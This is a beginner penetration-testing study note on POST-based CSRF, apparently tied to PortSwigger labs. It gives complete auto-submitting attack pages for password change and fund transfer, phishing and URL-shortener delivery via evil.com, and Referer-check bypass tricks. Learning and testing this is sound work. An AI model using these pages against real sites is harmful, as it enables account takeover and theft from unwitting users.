---
tags: [vapt, csrf, beginner]
difficulty: beginner
module: "11 - CSRF"
topic: "11.04 CSRF via POST Request"
portswigger_labs: ["CSRF vulnerability with no defenses", "CSRF where token validation depends on request method"]
---

# 11.04 — CSRF via POST Request

## POST-Based CSRF

Most sensitive actions use POST requests. CSRF via POST requires the victim to load an HTML page with an auto-submitting form. The form submits a POST request to the target site using the victim's cookies.

```
ATTACK COMPONENTS:
  1. Attacker hosts an HTML page with a hidden form
  2. Form targets the vulnerable endpoint (e.g., bank.com/transfer)
  3. Form auto-submits when the page loads (via JavaScript)
  4. Victim's browser submits the form to bank.com
  5. Victim's bank.com cookies are automatically included
  6. bank.com sees: authenticated POST request → executes the action!
```

---

## Auto-Submitting CSRF Form Template

```html
<!-- COMPLETE CSRF ATTACK PAGE: -->
<html>
<head>
  <title>Innocent Page</title>
</head>
<body onload="document.forms[0].submit()">
  <!-- The form is invisible: -->
  <form action="https://target.com/change-password" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
  </form>
</body>
</html>

<!-- ALTERNATIVE USING JAVASCRIPT: -->
<html>
<body>
  <form id="csrf-form" action="https://target.com/transfer" method="POST">
    <input type="hidden" name="amount" value="10000">
    <input type="hidden" name="to_account" value="ATTACKER_ACCOUNT">
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

---

## Delivery Methods

```html
<!-- METHOD 1: HOST ON YOUR SERVER -->
<!-- Victim visits: https://evil.com/csrf-attack.html -->

<!-- METHOD 2: STORED IN APP (if stored XSS or file upload) -->
<!-- Store the CSRF page inside target.com's own storage! -->

<!-- METHOD 3: PHISHING EMAIL -->
<!-- Send email: "Click here to claim your reward" →  link to csrf-attack.html -->

<!-- METHOD 4: EMBED IN LEGITIMATE PAGE (clickjacking combo) -->
<!-- Iframe + clickjacking → user thinks they're clicking something else -->

<!-- METHOD 5: URL SHORTENER -->
<!-- Obfuscate the attack URL: bit.ly/surprise → evil.com/csrf.html -->
```

---

## Testing POST CSRF (Step by Step)

```bash
# STEP 1: FIND A SENSITIVE POST ENDPOINT:
# Example: POST /settings/email HTTP/1.1
# Body: email=test@test.com

# STEP 2: EXAMINE FOR CSRF PROTECTIONS:
# Look for:
# - CSRF token in form: <input name="csrf_token" value="...">
# - CSRF token in headers: X-CSRF-Token, X-Requested-With
# - SameSite cookies
# - Origin/Referer checking

# STEP 3: IF NO CSRF TOKEN:
# Generate PoC with Burp Suite → Engagement Tools → Generate CSRF PoC
# OR manually create the HTML form

# STEP 4: TEST IN BROWSER:
# Log in as victim in browser tab 1
# Open attack HTML in browser tab 2 (same browser!)
# If action executes → CSRF confirmed!

# STEP 5: VERIFY:
# Check victim's account — was the email changed? Password reset?
```

---

## Burp CSRF PoC Generator

```
HOW TO USE BURP'S CSRF PoC GENERATOR:

1. In HTTP History, find the target POST request
2. Right-click → Engagement Tools → Generate CSRF PoC
3. Options:
   ✓ Include auto-submit script
   ✓ Set action URL
   ✓ Include all hidden fields
4. Click "Regenerate" → HTML is generated
5. "Copy HTML" → Save as test.html
6. Open test.html in browser while logged in to target
7. Does the action execute? → CSRF confirmed!

GENERATED OUTPUT EXAMPLE:
  <html>
  <body>
  <form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <input type="hidden" name="_token" value="EXISTING_TOKEN" />
  </form>
  <script>
    history.pushState('', '', '/');
    document.forms[0].submit();
  </script>
  </body>
  </html>
```

---

## Encoding Variants for Bypassing Referer Checks

```html
<!-- IF SERVER CHECKS REFERER HEADER: -->
<!-- Trick: blank referer or spoof it -->

<!-- BLANK REFERER VIA META REFERRER TAG: -->
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <form action="https://target.com/transfer" method="POST">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to" value="ATTACKER">
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
<!-- With no-referrer → Referer header is empty → bypass "Referer must match" check! -->

<!-- REFERER WITH TRUSTED DOMAIN IN URL: -->
<!-- Host attack page at: https://trusted.com.evil.com/csrf.html -->
<!-- Referer: https://trusted.com.evil.com/csrf.html -->
<!-- If check only looks for: if referer.includes('trusted.com') → bypass! -->
```

---

## Form Content Types and CSRF

```
CSRF WORKS FOR SIMPLE CONTENT TYPES:
  application/x-www-form-urlencoded  ← Standard HTML form
  multipart/form-data                ← File upload form  
  text/plain                         ← Simple text
  
THESE DO NOT REQUIRE PREFLIGHT → SENT WITHOUT CORS CHECK!

CSRF DOES NOT WORK FOR (without CORS bypass):
  application/json                   ← Requires preflight!
  application/xml
  Custom content types
  
BUT: Can sometimes bypass JSON requirement!
     See note 08 - CSRF via JSON Content-Type
```

---

## Related Notes
- [[01 - What is CSRF]] — fundamentals
- [[03 - CSRF via GET Request]] — GET-based CSRF
- [[05 - CSRF Token Bypass Techniques]] — defeating CSRF tokens
- [[08 - CSRF via JSON]] — bypassing JSON Content-Type requirement
- [[09 - CSRF to Account Takeover]] — escalation
